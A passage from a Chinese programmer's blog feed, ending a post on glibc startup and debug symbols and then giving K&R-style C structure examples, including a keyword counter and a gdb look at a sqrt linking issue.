src=\"/pwn%E5%85%A5%E9%97%A8-46-glibc%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95/image-20231105211445286.png\" alt=\"image-20231105211445286\"></p>\n<p>可以慢慢地去一探究竟程序的过程了！</p>\n<p><a href=\"https://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html\">https://refspecs.linuxbase.org/LSB_3.1.1/LSB-Core-generic/LSB-Core-generic/baselib---libc-start-main-.html</a></p>\n<p>​\t它会处理执行环境的初始化工作, 然后调用main函数, 并且处理main函数的返回,</p>\n<p>​\t它可能干的事如下</p>\n<ul>\n<li>performing any necessary security checks if the effective user ID is not the same as the real user ID.</li>\n<li>initialize the threading subsystem.</li>\n<li>registering the <code>*rtld_fini*</code> to release resources when this dynamic shared object exits (or is unloaded).</li>\n<li>registering the <code>*fini*</code> handler to run at program exit.</li>\n<li>calling the initializer function <code>(**init*)()</code>.</li>\n<li>calling <code>main()</code> with appropriate arguments.</li>\n<li>calling <code>exit()</code> with the return value from <code>main()</code>.</li>\n</ul>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://xuanxuanblingbling.github.io/ctf/tools/2020/03/20/gdb/\">https://xuanxuanblingbling.github.io/ctf/tools/2020/03/20/gdb/</a></p>\n<p>[原创]关于不同版本 glibc 更换的一些问题: <a href=\"https://bbs.kanxue.com/thread-254868.htm\">https://bbs.kanxue.com/thread-254868.htm</a></p>\n<p><a href=\"https://gist.github.com/stefan1wan/5e4b3973aae578ac39f94d30a5555f19\">https://gist.github.com/stefan1wan/5e4b3973aae578ac39f94d30a5555f19</a></p>\n<h1 id=\"问答\"><a href=\"#问答\" class=\"headerlink\" title=\"问答\"></a>问答</h1><p>有无符号的区别在哪呢….蒙圈了</p>\n<p>函数、变量符号</p>\n<p>有符号的话是可以看到定义的那些变量、函数等,但是不知道行数、具体的代码</p>\n<p>符号文件在哪?</p>\n<p>deb如何解包 dpkx -x   xxxxx.deb .&#x2F;</p>\n<p>debug文件为什么会有单独的,为什么glibcallinone里的不用呢</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-%E7%BB%93%E6%9E%84-%E8%BE%93%E5%85%A5%E4%B8%8E%E8%BE%93%E5%87%BA/",
            "url": "https://tangzichengcc.github.io/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-%E7%BB%93%E6%9E%84-%E8%BE%93%E5%85%A5%E4%B8%8E%E8%BE%93%E5%87%BA/",
            "title": "c语言回炉重造-结构-输入与输出",
            "date_published": "2023-10-31T10:00:20.000Z",
            "content_html": "<h1 id=\"第六章-结构\"><a href=\"#第六章-结构\" class=\"headerlink\" title=\"第六章 结构\"></a>第六章 结构</h1><p>​\t结构还是很重要的,在编写大型程序的时候,或者平常看源代码,会看到非常多的结构体</p>\n<h2 id=\"6-1-结构的基本知识\"><a href=\"#6-1-结构的基本知识\" class=\"headerlink\" title=\"6.1 结构的基本知识\"></a>6.1 结构的基本知识</h2><p>​\t在写这个程序的时候<font color=\"red\">遇到了很奇怪的问题</font>,dist &#x3D; sqrt(4.0);不会报错,但是dist &#x3D; sqrt(a);就会报错,百思不得其解.</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;math.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">point</span> &#123;</span></span><br><span class=\"line\">\t\t<span class=\"type\">int</span> x;</span><br><span class=\"line\">\t\t<span class=\"type\">int</span> y;</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">point</span> <span class=\"title\">maxpt</span> =</span> &#123;<span class=\"number\">320</span>,<span class=\"number\">200</span>&#125;;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;length: %d, width: %d\\n&quot;</span>,maxpt.x,maxpt.y);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">double</span> dist;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%f\\n&quot;</span>,(<span class=\"type\">double</span>)maxpt.x * maxpt.x + (<span class=\"type\">double</span>)maxpt.y * maxpt.y);</span><br><span class=\"line\">\tdist = <span class=\"built_in\">sqrt</span>(<span class=\"number\">4.0</span>);</span><br><span class=\"line\">\t<span class=\"type\">double</span> test = (<span class=\"type\">double</span>)maxpt.x * maxpt.x + (<span class=\"type\">double</span>)maxpt.y * maxpt.y;</span><br><span class=\"line\">\t<span class=\"type\">double</span> a = <span class=\"number\">4.0</span>;</span><br><span class=\"line\">\tdist = <span class=\"built_in\">sqrt</span>(a);</span><br><span class=\"line\">\t<span class=\"comment\">//dist = sqrt(test);</span></span><br><span class=\"line\">\t<span class=\"comment\">//dist = sqrt( (double)maxpt.x * maxpt.x + (double)maxpt.y * maxpt.y );</span></span><br><span class=\"line\">\t<span class=\"comment\">//printf(&quot;%f\\n&quot;,(double)maxpt.x * maxpt.x + (double)maxpt.y * maxpt.y);</span></span><br><span class=\"line\">\t<span class=\"comment\">//dist = sqrt(4.0);</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;duijiaoxian: %f\\n&quot;</span>,dist);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t神奇的gpt,所以是<font color=\"red\">编译优化的事</font>,   优化过后不用这个函数了,所以好像是显得没有问题一样,<strong>可以用gdb调试,会发现这里根本没有调用函数</strong></p>\n<img src=\"/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-%E7%BB%93%E6%9E%84-%E8%BE%93%E5%85%A5%E4%B8%8E%E8%BE%93%E5%87%BA/Snipaste_2023-10-31_15-34-14.jpg\" alt=\"Snipaste_2023-10-31_15-34-14\" style=\"zoom:50%;\">\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">► <span class=\"number\">0x5555555551b5</span> &lt;main+<span class=\"number\">108</span>&gt;    movsd  xmm0, qword ptr [rip + <span class=\"number\">0xe7b</span>]</span><br><span class=\"line\">  <span class=\"number\">0x5555555551bd</span> &lt;main+<span class=\"number\">116</span>&gt;    movsd  qword ptr [rbp - <span class=\"number\">0x20</span>], xmm0</span><br><span class=\"line\">  <span class=\"number\">0x5555555551c2</span> &lt;main+<span class=\"number\">121</span>&gt;    mov    eax, dword ptr [rbp - <span class=\"number\">8</span>]</span><br></pre></td></tr></table></figure>\n\n<p>​\t链接上就好了 gcc main.c -lm</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">► <span class=\"number\">0x555555555244</span> &lt;main+<span class=\"number\">219</span>&gt;    call   <span class=\"built_in\">sqrt</span>@plt                &lt;<span class=\"built_in\">sqrt</span>@plt&gt;</span><br><span class=\"line\">       x: <span class=\"number\">0x7ffff7e5f7e0</span> (_IO_stdfile_1_lock) ◂— <span class=\"number\">0x0</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"6-2-结构与函数\"><a href=\"#6-2-结构与函数\" class=\"headerlink\" title=\"6.2 结构与函数\"></a>6.2 结构与函数</h2><p>​\t</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;math.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">point</span> &#123;</span></span><br><span class=\"line\">\t\t<span class=\"type\">int</span> x;</span><br><span class=\"line\">\t\t<span class=\"type\">int</span> y;</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 矩形</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">rect</span> &#123;</span></span><br><span class=\"line\">      <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">point</span> <span class=\"title\">pt1</span>;</span></span><br><span class=\"line\">      <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">point</span> <span class=\"title\">pt2</span>;</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">struct</span> point <span class=\"title function_\">makepoint</span><span class=\"params\">(<span class=\"type\">int</span> x,<span class=\"type\">int</span> y)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">point</span> <span class=\"title\">temp</span>;</span></span><br><span class=\"line\">        temp.x = x;</span><br><span class=\"line\">        temp.y = y;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> temp;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">rect</span> <span class=\"title\">screen</span>;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">point</span> <span class=\"title\">middle</span>;</span></span><br><span class=\"line\">    <span class=\"keyword\">struct</span> point <span class=\"title function_\">makepoint</span><span class=\"params\">(<span class=\"type\">int</span>,<span class=\"type\">int</span>)</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"type\">int</span> XMAX, YMAX;</span><br><span class=\"line\">    XMAX = YMAX = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    screen.pt1 = makepoint(<span class=\"number\">100</span>,<span class=\"number\">100</span>);</span><br><span class=\"line\">    screen.pt2 = makepoint(XMAX,YMAX);</span><br><span class=\"line\"></span><br><span class=\"line\">    middle = makepoint((screen.pt1.x + screen.pt2.x)/<span class=\"number\">2</span>, (screen.pt1.y+screen.pt2.y)/<span class=\"number\">2</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;middle&#x27;s x=  %d, middle&#x27;s y = %d\\n&quot;</span>,middle.x,middle.y);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h2 id=\"6-3-结构数组\"><a href=\"#6-3-结构数组\" class=\"headerlink\" title=\"6.3 结构数组\"></a>6.3 结构数组</h2><p>​\t\t\t需要注意各种定义的先后顺序</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;ctype.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MAXWORD 100</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">key</span>&#123;</span></span><br><span class=\"line\">    <span class=\"type\">char</span> *word;</span><br><span class=\"line\">    <span class=\"type\">int</span> count;</span><br><span class=\"line\">&#125; keytab[] = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;auto&quot;</span>,<span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;break&quot;</span>,<span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;case&quot;</span>,<span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;char&quot;</span>,<span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;const&quot;</span>,<span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;continue&quot;</span>,<span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;default&quot;</span>,<span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;unsigned&quot;</span>,<span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;void&quot;</span>,<span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;volatile&quot;</span>,<span class=\"number\">0</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;while&quot;</span>,<span class=\"number\">0</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//如何定义查找的结构体的长度呢?</span></span><br><span class=\"line\"><span class=\"comment\">//#define NKEYS (sizeof keytab / sizeof(struct key))</span></span><br><span class=\"line\"><span class=\"comment\">// 下面这种更好,即使类型改变了,也不需要改动程序</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> NKEYS (sizeof keytab / sizeof keytab[0])</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getword</span><span class=\"params\">(<span class=\"type\">char</span> *,<span class=\"type\">int</span>)</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">binsearch</span><span class=\"params\">(<span class=\"type\">char</span> *, <span class=\"keyword\">struct</span> key *,<span class=\"type\">int</span>)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> n;</span><br><span class=\"line\">    <span class=\"type\">char</span> word[MAXWORD];</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">while</span> (getword(word,MAXWORD) != EOF)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"built_in\">isalpha</span>(word[<span class=\"number\">0</span>]))</span><br><span class=\"line\">            <span class=\"keyword\">if</span>((n = binsearch(word, keytab, NKEYS)) &gt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">                keytab[n].count++;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;test\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d\\n&quot;</span>,NKEYS);</span><br><span class=\"line\">   \t<span class=\"keyword\">for</span>(n=<span class=\"number\">0</span>; n &lt; NKEYS;n++)</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(keytab[n].count &gt;<span class=\"number\">0</span>)</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%4d %s\\n&quot;</span>,keytab[n].count, keytab[n].word);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 折半查找函数 、在tab[0]&lt;=tab[1]&lt;=tab[2]&lt;=....tab[n-1]中查找word</span></span><br><span class=\"line\"><span class=\"comment\">// 如果在这里面判断是否到结尾的话,是不是有可能判断是否,比如有脏数据这种?</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">binsearch</span><span class=\"params\">(<span class=\"type\">char</span> *word,<span class=\"keyword\">struct</span> key tab[],<span class=\"type\">int</span> n)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> cond;</span><br><span class=\"line\">    <span class=\"type\">int</span> low,high,mid;</span><br><span class=\"line\">    low = <span class=\"number\">0</span>;</span><br><span class=\"line\">    high = n<span class=\"number\">-1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(low &lt;= high)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        mid = (low + high)/<span class=\"number\">2</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((cond = <span class=\"built_in\">strcmp</span>(word,tab[mid].word)) &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">            high = mid - <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(cond &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">            low = mid + <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> mid;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>; <span class=\"comment\">//没有匹配的值</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//从输入中读取下一个单词或字符</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getword</span><span class=\"params\">(<span class=\"type\">char</span> *word, <span class=\"type\">int</span> lim)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> c,getch(<span class=\"type\">void</span>);</span><br><span class=\"line\">    <span class=\"type\">void</span> <span class=\"title function_\">ungetch</span><span class=\"params\">(<span class=\"type\">int</span>)</span>;</span><br><span class=\"line\">    <span class=\"type\">char</span> *w = word;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">while</span> (<span class=\"built_in\">isspace</span>(c = getch())) ; </span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (c!=EOF)</span><br><span class=\"line\">        *w++ = c;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"built_in\">isalpha</span>(c))&#123; <span class=\"comment\">//说明是单个字符,</span></span><br><span class=\"line\">        *w = <span class=\"string\">&#x27;\\0&#x27;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(; --lim &gt;<span class=\"number\">0</span>; w++)</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"built_in\">isalnum</span>(*w=getch()))&#123;</span><br><span class=\"line\">            ungetch(*w);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    *w = <span class=\"string\">&#x27;\\0&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> word[<span class=\"number\">0</span>];<span class=\"comment\">//为啥要这样呢????, 为什么不是word呢, 看返回值类型,不是返回一个指针</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> BUFSIZE 100</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> buf[BUFSIZE];</span><br><span class=\"line\"><span class=\"type\">int</span> bufp = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getch</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (bufp &gt; <span class=\"number\">0</span>)? buf[--bufp] : getchar();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">ungetch</span><span class=\"params\">(<span class=\"type\">int</span> c)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (bufp &gt;= BUFSIZE)</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;ungetch: too many characters\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        buf[bufp++] = c;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>&lt;ctype.h&gt;中</p>\n<p>isspace 判断是否是空白符号, isalpha判断是否是字母,isalnum判断是否是数字或字母</p>\n<p>标准的空白字符</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&#x27; &#x27;</span>     (<span class=\"number\">0x20</span>)\tspace (SPC) 空格符</span><br><span class=\"line\"><span class=\"string\">&#x27;\\t&#x27;</span>\t(<span class=\"number\">0x09</span>)\thorizontal <span class=\"title function_\">tab</span> <span class=\"params\">(TAB)</span> 水平制表符\t</span><br><span class=\"line\">&#x27;\\n&#x27;\t<span class=\"params\">(<span class=\"number\">0x0a</span>)</span>\t<span class=\"title function_\">newline</span> <span class=\"params\">(LF)</span> 换行符</span><br><span class=\"line\">&#x27;\\v&#x27;\t<span class=\"params\">(<span class=\"number\">0x0b</span>)</span>\tvertical <span class=\"title function_\">tab</span> <span class=\"params\">(VT)</span> 垂直制表符</span><br><span class=\"line\">&#x27;\\f&#x27;\t<span class=\"params\">(<span class=\"number\">0x0c</span>)</span>\t<span class=\"title function_\">feed</span> <span class=\"params\">(FF)</span> 换页符</span><br><span class=\"line\">&#x27;\\r&#x27;\t<span class=\"params\">(<span class=\"number\">0x0d</span>)</span>\tcarriage <span class=\"title function_\">return</span> <span class=\"params\">(CR)</span> 回车符</span><br></pre></td></tr></table></figure>\n\n\n\n<p>ctrl+d获取EOF结束输入</p>\n<h2 id=\"6-4-指向结构的指针\"><a href=\"#6-4-指向结构的指针\" class=\"headerlink\" title=\"6.4 指向结构的指针\"></a>6.4 指向结构的指针</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span 